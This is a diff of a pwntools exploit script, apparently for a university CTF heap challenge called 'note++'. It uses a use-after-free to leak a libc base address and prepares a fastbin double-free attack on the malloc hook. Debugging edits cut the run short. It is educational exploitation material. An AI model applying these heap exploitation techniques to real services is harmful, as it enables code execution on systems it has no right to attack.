@@ -6,28 +6,33 @@ context.clear(arch='x86_64')
 # chunk malloc hook
 # r = remote('edu-ctf.csie.org', 10178)
 r = process('./note++')
+libc = ELF('./libc.so', checksec=False)
 
-def add(size, note):
+def add(size, note, description):
     r.sendafter('>', '1')
     r.sendafter('Size: ', str(size))
     r.sendafter('Note: ', note)
+    r.sendafter('note: ', description)
 
 def show(idx):
     r.sendafter('>', '2')
-    r.sendafter('Index: ', str(idx))
+    r.send(str(idx))
 
 def delete(idx):
     r.sendafter('>', '3')
     r.sendafter('Index: ', str(idx))
 
-add(0x100, '\x87' * 4) # note 0
-add(0x68, '\x88') # note 1, to avoid merging with top chunk
-add(0x68, '\x89') # note 2, another fastbin size for fastbin 1, 2, 1 attack
+add(0x68, '\x87' * 4, '\x87' * 48) # note 0
+add(0x68, '\x88' * 4, '\x87' * 48) # note 1, to avoid merging with top chunk
+add(0x68, '\x89' * 4, '\x87' * 48) # note 2, another fastbin size for fastbin 1, 2, 1 attack
+pause()
 
 # exploit UAF to do information leak
+r.interactive()
 delete(0)
 show(0)
-r.recvline()
+print('listnote --> ', r.recv())
+exit()
 
 libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
 print('libc_base --> ', hex(libc_base))
@@ -38,6 +43,7 @@ delete(2)
 delete(1)
 
 libc = ELF('./libc-2.23.so')
+exit(0)
 
 # send some malicious payload to it
 # why 0x10 - 3??: to make system check for legel chunk (flag ok, size ok, can same size with 0x70 series)
